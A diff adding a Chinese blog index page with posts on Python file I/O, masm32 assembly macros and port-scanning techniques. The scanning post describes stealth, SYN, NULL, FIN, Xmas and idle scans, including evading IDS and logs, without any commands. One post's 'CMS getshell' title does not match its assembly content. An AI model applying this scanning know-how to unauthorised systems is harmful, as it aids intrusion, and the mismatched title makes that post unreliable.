+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/编程开发/">编程开发</a>►<a class="article-category-link" href="/categories/编程开发/Python/">Python</a>
+</div>
+
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand [layout]" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2016/01/01/pyton之with open as用法/" title="pyton之with open as用法" itemprop="url">pyton之with open as用法</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
+		
+  <p class="article-time">
+    <time datetime="2016-01-01T02:10:50.000Z" itemprop="datePublished"> 发表于 2016-01-01</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <p>python文件读写,以后就用with open语句</p>
+<p>读写文件是最常见的IO操作。Python内置了读写文件的函数，用法和C是兼容的。<br>读写文件前，我们先必须了解一下，在磁盘上读写文件的功能都是由操作系统提供的，现代操作系统不允许普通的程序直接操作磁盘，所以，读写文件就是请求操作系统打开一个文件对象（通常称为文件描述符），然后，通过操作系统提供的接口从这个文件对象中读取数据（读文件），或者把数据写入这个文件对象（写文件）。</p>
+<h2 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h2><p>要以读文件的模式打开一个文件对象，使用Python内置的open()函数，传入文件名和标示符：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f = open(<span class="string">'/Users/michael/test.txt'</span>, <span class="string">'r'</span>)</span><br></pre></td></tr></table></figure></p>
+<p>标示符’r’表示读，这样，我们就成功地打开了一个文件。</p>
+<p>如果文件不存在，open()函数就会抛出一个IOError的错误，并且给出错误码和详细的信息告诉你文件不存在：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f=open(<span class="string">'/Users/michael/notfound.txt'</span>, <span class="string">'r'</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line 1, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">FileNotFoundError: [Errno 2] No such file or directory: <span class="string">'/Users/michael/notfound.txt'</span></span><br></pre></td></tr></table></figure></p>
+<p>如果文件打开成功，接下来，调用read()方法可以一次读取文件的全部内容，Python把内容读到内存，用一个str对象表示：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f.read()</span><br><span class="line"><span class="string">'Hello, world!'</span></span><br></pre></td></tr></table></figure></p>
+<p>最后一步是调用close()方法关闭文件。文件使用完毕后必须关闭，因为文件对象会占用操作系统的资源，并且操作系统同一时间能打开的文件数量也是有限的：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f.close()</span><br></pre></td></tr></table></figure></p>
+<p>由于文件读写时都有可能产生IOError，一旦出错，后面的f.close()就不会调用。所以，为了保证无论是否出错都能正确地关闭文件，我们可以使用try … finally来实现：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    f = open(<span class="string">'/path/to/file'</span>, <span class="string">'r'</span>)</span><br><span class="line">    <span class="built_in">print</span>(f.read())</span><br><span class="line">finally:</span><br><span class="line">    <span class="keyword">if</span> f:</span><br><span class="line">        f.close()</span><br></pre></td></tr></table></figure></p>
+<p>但是每次都这么写实在太繁琐，所以，Python引入了with语句来自动帮我们调用close()方法：</p>
+<p>with open(‘/path/to/file’, ‘r’) as f:<br>    print(f.read())</p>
+<p>这和前面的try … finally是一样的，但是代码更佳简洁，并且不必调用f.close()方法。</p>
+<p>调用read()会一次性读取文件的全部内容，如果文件有10G，内存就爆了，所以，要保险起见，可以反复调用read(size)方法，每次最多读取size个字节的内容。另外，调用readline()可以每次读取一行内容，调用readlines()一次读取所有内容并按行返回list。因此，要根据需要决定怎么调用。</p>
+<p>如果文件很小，read()一次性读取最方便；如果不能确定文件大小，反复调用read(size)比较保险；如果是配置文件，调用readlines()最方便：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">    <span class="built_in">print</span>(line.strip()) <span class="comment"># 把末尾的'\n'删掉</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h2><p>写文件和读文件是一样的，唯一区别是调用open()函数时，传入标识符’w’或者’wb’表示写文本文件或写二进制文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f = open(<span class="string">'/Users/michael/test.txt'</span>, <span class="string">'w'</span>)</span><br><span class="line">&gt;&gt;&gt; f.write(<span class="string">'Hello, world!'</span>)</span><br><span class="line">&gt;&gt;&gt; f.close()</span><br></pre></td></tr></table></figure></p>
+<p>你可以反复调用write()来写入文件，但是务必要调用f.close()来关闭文件。当我们写文件时，操作系统往往不会立刻把数据写入磁盘，而是放到内存缓存起来，空闲的时候再慢慢写入。只有调用close()方法时，操作系统才保证把没有写入的数据全部写入磁盘。忘记调用close()的后果是数据可能只写了一部分到磁盘，剩下的丢失了。所以，还是用with语句来得保险：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with open(<span class="string">'/Users/michael/test.txt'</span>, <span class="string">'w'</span>) as f:</span><br><span class="line">    f.write(<span class="string">'Hello, world!'</span>)</span><br></pre></td></tr></table></figure></p>
+<p>要写入特定编码的文本文件，请给open()函数传入encoding参数，将字符串自动转换成指定编码<br>字符编码</p>
+<p>要读取非UTF-8编码的文本文件，需要给open()函数传入encoding参数，例如，读取GBK编码的文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f = open(<span class="string">'/Users/michael/gbk.txt'</span>, <span class="string">'r'</span>, encoding=<span class="string">'gbk'</span>)</span><br><span class="line">&gt;&gt;&gt; f.read()</span><br></pre></td></tr></table></figure></p>
+<p>遇到有些编码不规范的文件，你可能会遇到UnicodeDecodeError，因为在文本文件中可能夹杂了一些非法编码的字符。遇到这种情况，open()函数还接收一个errors参数，表示如果遇到编码错误后如何处理。最简单的方式是直接忽略：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f = open(<span class="string">'/Users/michael/gbk.txt'</span>, <span class="string">'r'</span>, encoding=<span class="string">'gbk'</span>, errors=<span class="string">'ignore'</span>)</span><br></pre></td></tr></table></figure></p>
+<p>二进制文件</p>
+<p>前面讲的默认都是读取文本文件，并且是UTF-8编码的文本文件。要读取二进制文件，比如图片、视频等等，用’rb’模式打开文件即可：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f = open(<span class="string">'/Users/michael/test.jpg'</span>, <span class="string">'rb'</span>)</span><br><span class="line">&gt;&gt;&gt; f.read()</span><br><span class="line">b<span class="string">'\xff\xd8\xff\xe1\x00\x18Exif\x00\x00...'</span> <span class="comment"># 十六进制表示的字节</span></span><br></pre></td></tr></table></figure></p>
+<p>总结：以后读写文件都使用with open语句，不要再像以前那样用f = open()这种语句了<br>对于多个文件的读写，可以写成以下两种方式：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">with open(<span class="string">'/home/xbwang/Desktop/output_measures.txt'</span>,<span class="string">'r'</span>) as f:</span><br><span class="line">    with open(<span class="string">'/home/xbwang/Desktop/output_measures2.txt'</span>,<span class="string">'r'</span>) as f1:</span><br><span class="line">        with open(<span class="string">'/home/xbwang/Desktop/output_output_bk.txt'</span>,<span class="string">'r'</span>) as f2:</span><br><span class="line">　　　　　　　........</span><br><span class="line">　　　　　　　........</span><br><span class="line">　　　　　　　........</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">with open(<span class="string">'/home/xbwang/Desktop/output_measures.txt'</span>,<span class="string">'r'</span>) as f:</span><br><span class="line">........</span><br><span class="line">with open(<span class="string">'/home/xbwang/Desktop/output_measures2.txt'</span>,<span class="string">'r'</span>) as f1:</span><br><span class="line">........</span><br><span class="line">with open(<span class="string">'/home/xbwang/Desktop/output_output_bk.txt'</span>,<span class="string">'r'</span>) as f2:</span><br><span class="line">........</span><br></pre></td></tr></table></figure>
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/编程开发/">编程开发</a>►<a class="article-category-link" href="/categories/编程开发/Python/">Python</a>
+</div>
+
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand [layout]" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2016/01/01/常见的端口扫描类型及原理/" title="端口渗透及方法" itemprop="url">端口渗透及方法</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
+		
+  <p class="article-time">
+    <time datetime="2016-01-01T02:10:50.000Z" itemprop="datePublished"> 发表于 2016-01-01</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <p>常见的端口扫描类型及原理</p>
+<p>更新中<br>常见的扫描类型有以下几种：</p>
+<h1 id="秘密扫描"><a href="#秘密扫描" class="headerlink" title="秘密扫描"></a>秘密扫描</h1><p>秘密扫描是一种不被审计工具所检测的扫描技术。<br>它通常用于在通过普通的防火墙或路由器的筛选（filtering）时隐藏自己。<br>秘密扫描能躲避IDS、防火墙、包过滤器和日志审计，从而获取目标端口的开放或关闭的信息。由于没有包含TCP 3次握手协议的任何部分，所以无法被记录下来，比半连接扫描更为隐蔽。<br>但是这种扫描的缺点是扫描结果的不可靠性会增加，而且扫描主机也需要自己构造IP包。现有的秘密扫描有TCP FIN扫描、TCP ACK扫描、NULL扫描、XMAS扫描和SYN/ACK扫描等。 </p>
+<h2 id="Connect-扫描："><a href="#Connect-扫描：" class="headerlink" title="Connect()扫描："></a>Connect()扫描：</h2><p>此扫描试图与每一个TCP端口进行“三次握手”通信。如果能够成功建立接连，则证明端口开发，否则为关闭。准确度很高，但是最容易被防火墙和IDS检测到，并且在目标主机的日志中会记录大量的连接请求以及错误信息。</p>
+<h3 id="TCP-connect端口扫描服务端与客户端建立连接成功（目标端口开放）的过程："><a href="#TCP-connect端口扫描服务端与客户端建立连接成功（目标端口开放）的过程：" class="headerlink" title="TCP connect端口扫描服务端与客户端建立连接成功（目标端口开放）的过程："></a>TCP connect端口扫描服务端与客户端建立连接成功（目标端口开放）的过程：</h3><p>① Client端发送SYN；<br>② Server端返回SYN/ACK，表明端口开放；<br>③ Client端返回ACK，表明连接已建立；<br>④ Client端主动断开连接。<br>建立连接成功（目标端口开放）如图所示</p>
+<h3 id="TCP-connect端口扫描服务端与客户端未建立连接成功（目标端口关闭）过程："><a href="#TCP-connect端口扫描服务端与客户端未建立连接成功（目标端口关闭）过程：" class="headerlink" title="TCP connect端口扫描服务端与客户端未建立连接成功（目标端口关闭）过程："></a>TCP connect端口扫描服务端与客户端未建立连接成功（目标端口关闭）过程：</h3><p>① Client端发送SYN；<br>② Server端返回RST/ACK，表明端口未开放。<br>未建立连接成功(目标端口关闭)如图所示。</p>
+<p><b>优点：</b><br>实现简单，对操作者的权限没有严格要求（有些类型的端口扫描需要操作者具有root权限），系统中的任何用户都有权力使用这个调用，而且如果想要得到从目标端口返回banners信息，也只能采用这一方法。<br>另一优点是扫描速度快。如果对每个目标端口以线性的方式，使用单独的connect()调用，可以通过同时打开多个套接字，从而加速扫描。<br><b>缺点：</b><br>是会在目标主机的日志记录中留下痕迹，易被发现，并且数据包会被过滤掉。目标主机的logs文件会显示一连串的连接和连接出错的服务信息，并且能很快地使它关闭。</p>
+<h2 id="SYN扫描："><a href="#SYN扫描：" class="headerlink" title="SYN扫描："></a>SYN扫描：</h2><p>扫描器向目标主机的一个端口发送请求连接的SYN包，扫描器在收到SYN/ACK后，不是发送的ACK应答而是发送RST包请求断开连接。这样，三次握手就没有完成，无法建立正常的TCP连接，因此，这次扫描就不会被记录到系统日志中。这种扫描技术一般不会在目标主机上留下扫描痕迹。但是，这种扫描需要有root权限。</p>
+<h3 id="端口开放："><a href="#端口开放：" class="headerlink" title="端口开放："></a>端口开放：</h3><p>1、Client发送SYN<br>2、Server端发送SYN/ACK<br>Client发送RST断开（只需要前两步就可以判断端口开放）</p>
+<h3 id="端口关闭："><a href="#端口关闭：" class="headerlink" title="端口关闭："></a>端口关闭：</h3><p>1、Client发送SYN<br>2、Server端回复RST（表示端口关闭）</p>
+<p><b>优点：</b><br>SYN扫描要比TCP         Connect()扫描隐蔽一些，SYN仅仅需要发送初始的SYN数据包给目标主机，如果端口开放，则相应SYN-ACK数据包；如果关闭，则响应RST数据包；</p>
+<h2 id="NULL扫描："><a href="#NULL扫描：" class="headerlink" title="NULL扫描："></a>NULL扫描：</h2><p>反向扫描—-原理是将一个没有设置任何标志位的数据包发送给TCP端口，在正常的通信中至少要设置一个标志位，根据FRC 793的要求，在端口关闭的情况下，若收到一个没有设置标志位的数据字段，那么主机应该舍弃这个分段，并发送一个RST数据包，否则不会响应发起扫描的客户端计算机。也就是说，如果TCP端口处于关闭则响应一个RST数据包，若处于开放则无相应。但是应该知道理由NULL扫描要求所有的主机都符合RFC 793规定，但是windows系统主机不遵从RFC 793标准，且只要收到没有设置任何标志位的数据包时，不管端口是处于开放还是关闭都响应一个RST数据包。但是基于Unix(<em>nix,如Linux)遵从RFC 793标准，所以可以用NULL扫描。   经过上面的分析，我们知道NULL可以辨别某台主机运行的操作系统是什么操作系统，是为windows呢？还是</em>nix？</p>
+<h3 id="端口开放：Client发送Null，server没有响应"><a href="#端口开放：Client发送Null，server没有响应" class="headerlink" title="端口开放：Client发送Null，server没有响应"></a>端口开放：Client发送Null，server没有响应</h3><h3 id="端口关闭：1、Client发送NUll-2、Server回复RST"><a href="#端口关闭：1、Client发送NUll-2、Server回复RST" class="headerlink" title="端口关闭：1、Client发送NUll   2、Server回复RST"></a>端口关闭：1、Client发送NUll   2、Server回复RST</h3><p>说明：Null扫描和前面的TCP Connect（）和SYN的判断条件正好相反。在前两种扫描中，有响应数据包的表示端口开放，但在NUll扫描中，收到响应数据包表示端口关闭。反向扫描比前两种隐蔽性高些，当精确度也相对低一些。</p>
+<p>用途：判断是否为Windows系统还是*nix</p>
+<h2 id="FIN扫描："><a href="#FIN扫描：" class="headerlink" title="FIN扫描："></a>FIN扫描：</h2><p>与NULL有点类似，只是FIN为指示TCP会话结束，在FIN扫描中一个设置了FIN位的数据包被发送后，若响应RST数据包，则表示端口关闭，没有响应则表示开放。此类扫描同样不能准确判断windows系统上端口开发情况。</p>
+<h3 id="端口开放：-1"><a href="#端口开放：-1" class="headerlink" title="端口开放："></a>端口开放：</h3><p>发送FIN，没有响应</p>
+<h3 id="端口关闭：-1"><a href="#端口关闭：-1" class="headerlink" title="端口关闭："></a>端口关闭：</h3><p>1、发送FIN<br>2、回复RST</p>
+<h2 id="ACK扫描："><a href="#ACK扫描：" class="headerlink" title="ACK扫描："></a>ACK扫描：</h2><p>扫描主机向目标主机发送ACK数据包。根据返回的RST数据包有两种方法可以得到端口的信息。方法一是： 若返回的RST数据包的TTL值小于或等于64，则端口开放，反之端口关闭，如图所示。</p>
+<h2 id="Xmas-Tree扫描："><a href="#Xmas-Tree扫描：" class="headerlink" title="Xmas-Tree扫描："></a>Xmas-Tree扫描：</h2><p>通过发送带有下列标志位的tcp数据包<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URG：指示数据时紧急数据，应立即处理。</span><br><span class="line">PSH：强制将数据压入缓冲区。</span><br><span class="line">FIN：在结束TCP会话时使用。</span><br></pre></td></tr></table></figure></p>
+<p>正常情况下，三个标志位不能被同时设置，但在此种扫描中可以用来判断哪些端口关闭还是开放，与上面的反向扫描情况相同，依然不能判断windows平台上的端口。</p>
+<h3 id="端口开放：-2"><a href="#端口开放：-2" class="headerlink" title="端口开放："></a>端口开放：</h3><p>发送URG/PSH/FIN,没有响应</p>
+<h3 id="端口关闭：-2"><a href="#端口关闭：-2" class="headerlink" title="端口关闭："></a>端口关闭：</h3><p>1、发送URG/PSH/FIN,没有响应<br>2、响应RST</p>
+<p>XMAS扫描原理和NULL扫描的类似，将TCP数据包中的ACK、FIN、RST、SYN、URG、PSH标志位置1后发送给目标主机。在目标端口开放的情况下，目标主机将不返回任何信息。</p>
+<h2 id="Dump扫描："><a href="#Dump扫描：" class="headerlink" title="Dump扫描："></a>Dump扫描：</h2><p>也被称为Idle扫描或反向扫描，在扫描主机时应用了第三方僵尸计算机扫描。由僵尸主机向目标主机发送SYN包。目标主机端口开发时回应SYN|ACK，关闭时返回RST，僵尸主机对SYN|ACK回应RST，对RST不做回应。从僵尸主机上进行扫描时，进行的是一个从本地计算机到僵尸主机的、连续的ping操作。查看僵尸主机返回的Echo响应的ID字段，能确定目标主机上哪些端口是开放的还是关闭的。</p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/端口/">端口</a>
+</div>
+
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand [layout]" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2016/01/01/汇编masm32的用法/" title="记一次曲折的搜搜!CMSgetshell" itemprop="url">记一次曲折的搜搜!CMSgetshell</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
+		
+  <p class="article-time">
+    <time datetime="2016-01-01T02:10:50.000Z" itemprop="datePublished"> 发表于 2016-01-01</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <p>观看本文需要你使用masm32+kmdkit软件包. 其实差不多有masm32就够了, kmdkit本文说的很少. 还有需要你设置好了环境变量. 这个问题我不会在这里讨论. 如果你下面的宏你用不了, 差不多就是环境变量的问题..<br>masm32的使用<br>简化的汇编代码:<br>首先以前如果你每次写汇编程序都这样:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.586</span><br><span class="line">.model flat, stdcall</span><br><span class="line">option casemap:none</span><br><span class="line">Include windows.inc</span><br><span class="line">....</span><br></pre></td></tr></table></figure></p>
+<p>太长了, 为此masm32包里面早就给我们带了一个很有用的头文件, 如果你是用masm32写<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    Include masm32rt.inc</span><br><span class="line">    .code</span><br><span class="line">main  proc</span><br><span class="line">    Invoke crt_cprintf, cfm$( <span class="string">"hell"</span> )</span><br><span class="line">main  Endp</span><br><span class="line">End  main</span><br></pre></td></tr></table></figure></p>
+<p>注意你也许看到我使用了crt_cprintf, 这个函数哪里来的呢? 很简单. 翻开你的masm32 Include文件夹, 查找msvcrt.inc头文件里面已经带了C语言所有的函数库了. 你也许会说. 用了这个函数有没有什么副作用什么的. 其实微软从2000或者xp开始吧, 系统已经带了这个运行库. C语言的运行库. 我还想研究下C++的运行库. 调用C++的cout, 不过鉴于这个cout使用起来比较麻烦. 就作罢了. 其实没事的时候你可以去windows文件夹下面去翻翻. 学汇编就应该有这个必要. 看看里面有什么有价值的东西.</p>
+<p>当然前面加个crt_觉得有点长. aogosoft上面已经有人搞成普通C语言的用法了. 我就不说了自己去找找. 我不喜欢那样. 我喜欢前面只加个cprintf 用以和windows的函数做区分.<br>注释:<br>关于注释我也说两句, 其实在汇编里面是 支持两种注释的, 一种是以;号开头的作为注释. 和C++的//一样.<br>还有一种注释是<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">comment <span class="comment">#</span></span><br><span class="line">   This is comment</span><br><span class="line">   This is comment            </span><br><span class="line">        <span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
+<p>两个#好中的就是注释, 当然你也可以不用#用$或者其他的.自己试试就能够试出效果了..</p>
+<p>文本宏:</p>
+<p>首先一个在汇编中经常写代码需要这样. 比如调用MessageBox<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke  MessageBox, NULL, offset SzText, offset SzCaption, NULL</span><br></pre></td></tr></table></figure></p>
+<p>这也是很蛋疼的一件事情, 当然网上已经有很多教程说到了用masm32包里面带的cfm$宏. 是的当然我还会说一些别人没有说到的东西. 如果用了cfm$宏以后效果就是这样了:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke  MessageBox, NULL, cfm$( <span class="string">"hello"</span> ), cfm$( <span class="string">"Information"</span>), NULL</span><br></pre></td></tr></table></figure></p>
+<p>简单一些了, 很舒服, 这个宏很多地方都有, 包括kmdkit包里面带的$CTA0宏. 也是差不多的效果.不过$CTA0宏比cfm$好一些. 因为$CTA0在字符串重复定义的时候不会浪费空间. 说了这些宏相信你应该很亟不可待的想使用下这些宏的效果了. 再说一次如果你的环境是masm32+kmdkit这些宏都可以直接用了..</p>
+<p>汇编支持Unicode</p>
+<p>关于这个宏是我最近才搞定的问题. 其实masm32包里面已经自带了Unicode宏支持. 不过只支持英文. .我倒. 这样的宏有什么用呢? masm32不支持中文宏一直以来都是我的一块心病. 其实gb2312转Unicode也是一个查表的工作. 只是工作量太大. 我原本计划有时间的时候就自己写一个查表的宏来支持Unicode.不过有人已经做了这件事情. 奇怪的是为什么这件事情不广为人知. 难道大家都没有让汇编支持Unicode的想法? 想不通了. 好吧以后你可以这样使用Unicode宏了, 当然支持中文的. 这个宏我已经上传了. 以后你可以抛弃cfm$了. 就和我一样. 来看看使用Unicode程序是什么样的, 宏是人家写的不过我改了下名字. 因为名字短点写起来快..<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">    Include masm32rt.inc</span><br><span class="line">    Include Unicode.inc</span><br><span class="line">;===================================================================</span><br><span class="line">    .data</span><br><span class="line">SzText ustr     (<span class="string">"中文中文"</span>, 0)</span><br><span class="line">    .code</span><br><span class="line"></span><br><span class="line">main    proc</span><br><span class="line">   </span><br><span class="line">    Invoke    MessageBoxW, 0, offset SzText, ustr$( <span class="string">"中文提示"</span> ), NULL</span><br><span class="line">    ret</span><br><span class="line">   </span><br><span class="line">main    Endp</span><br><span class="line">End    main</span><br></pre></td></tr></table></figure></p>
+<p>已经很给里了吧. 呵呵我用的比较多的是ustr$, ustr$和ustr一个是宏, 一个是宏函数. 关于他们的区别. 请google 你在使用这个宏的时候记得导入Unicode.inc头文件. 就可以了. 用汇编写程序舒服吗?</p>
+<p>高级语法:</p>
+<p>上面说的已经有些给力了吧. 估计你还不满足. 我了解这点. 我也是一样. 以前我听了罗云彬的话一般不用宏. 当然现在我的汇编程序大量使用宏. 就和上面的ustr$这种一样, 它并不会在代码中添加什么东西.</p>
+<p>关于高级语法. 好像汇编比其他语言少的就是switch .. case 和for循环. 来我们搞定这两个. switch宏masm32包已经给我们搞定了而且搞的比C语言的还给力. C语言的只能够比较dword类型吧. 汇编的还能够switch 字符串. 真给力, 看看用法. 这个是masm32带的, 自己去masm32包里面找找能够找到你想要的东西. 打包masm32的这个家伙已经把很多东西都给我们搞定了. 里面有很大好用的函数. 和宏. 包括readline. 以前用Java对这个印象非常深刻. 一次读一行. masm32里面有. 我不能够都说完, 很多东西还需要自己去发掘.. 总之就是给力..<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">switch   uMsg</span><br><span class="line"><span class="keyword">case</span>     WM_INITDIALOG</span><br><span class="line">    invoke SendMessage,hWin,WM_SETICON,1, FUNC(LoadIcon,NULL,IDI_ASTERISK)</span><br><span class="line">    m2m    hWnd, hWin</span><br><span class="line">    <span class="built_in">return</span> 1</span><br><span class="line">    </span><br><span class="line"><span class="keyword">case</span>     WM_COMMAND</span><br><span class="line">    switch wParam</span><br><span class="line">    <span class="keyword">case</span>   IDOK</span><br><span class="line">        fn MessageBox,hWnd,<span class="string">"You clicked OK"</span>,<span class="string">"Hi"</span>,MB_OK or MB_ICONINFORMATION</span><br><span class="line"></span><br><span class="line">     <span class="keyword">case</span>  IDCANCEL</span><br><span class="line">        jmp quit_dialog</span><br><span class="line">    endsw</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span>     WM_CLOSE</span><br><span class="line">    quit_dialog:</span><br><span class="line">    invoke EndDialog,hWin,0</span><br><span class="line">endsw</span><br></pre></td></tr></table></figure></p>
+<p>恩, 其实这个宏很给力的, 只是这个编辑器有点蛋疼. masm32自带的帮助里面哟详细的说明文档. 我就不啰嗦了. switch$可以比较字符串. 上面还用了其他的宏. 都是masm32自带的fn啊, rv啊.什么的. 自己好好看看..return 也有</p>
+<p>switch搞定以后还有什么没有… 对for没有. 我以前学Java喜欢动不动就for一下. 不过现在不这样了. 现在比较喜欢用while了.当然是在这个for宏之前. 看看什么样子?<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">    Include masm32rt.inc</span><br><span class="line">    Include for.inc</span><br><span class="line">    .code</span><br><span class="line">;===================================================================</span><br><span class="line">main    proc</span><br><span class="line">    <span class="built_in">local</span>    _dwTemp:dword</span><br><span class="line">   </span><br><span class="line">    ;初始化ebx的值为0, 最大为10每次步进1</span><br><span class="line">    _for    ebx, 0, 10, 1</span><br><span class="line">        ;Invoke    cprintf, 0,  cfm$( <span class="string">"%d"</span> ), 0, ebx</span><br><span class="line">    _next</span><br><span class="line">   </span><br><span class="line">    ;初始化_dwTemp为0, 最大为10每次步进2</span><br><span class="line">    _for    _dwTemp, 0, 10, 2</span><br><span class="line">        </span><br><span class="line">    _next</span><br><span class="line">    ret</span><br><span class="line">   </span><br><span class="line">main    Endp</span><br><span class="line">End    main</span><br></pre></td></tr></table></figure></p>
+<p>用法注释里面有了. 名字我弄成了_for, 附件我也上传了. for.inc. 自己下载观察下. 对了这个宏是objasm中带的.里面有很大的宏. 规模大过masm32里面的宏规模. 还是那句话. 我挑重点的说说. 然后还是需要你自己去发掘新的东西.</p>
